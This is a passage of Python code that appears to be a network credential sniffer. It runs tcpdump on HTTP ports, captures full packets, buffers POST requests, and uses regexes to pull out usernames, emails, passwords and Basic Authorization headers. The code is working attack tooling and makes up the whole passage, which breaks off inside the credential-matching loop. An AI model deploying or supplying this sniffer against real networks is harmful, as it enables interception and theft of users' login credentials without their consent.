        '-A',  # ASCII output
        '-s', '0',  # Full packet capture
        'tcp port 80 or tcp port 8080',
    ]
    if count > 0:
        cmd.extend(['-c', str(count)])

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

    buffer = []
    cred_patterns = [
        re.compile(r'(?:user(?:name)?|login|email)=([^&\s]+)', re.IGNORECASE),
        re.compile(r'(?:pass(?:word)?|pwd|passwd)=([^&\s]+)', re.IGNORECASE),
        re.compile(r'Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)', re.IGNORECASE),
    ]

    try:
        for line in proc.stdout:
            line = line.strip()

            # Check for POST data
            if 'POST' in line:
                buffer = [line]
                continue

            if buffer:
                buffer.append(line)

                # Look for credential patterns
                for pattern in cred_patterns:
                    match = pattern.search(line)
                    if match:
                        # Extract the full POST context
                        host = ''
                        path = ''
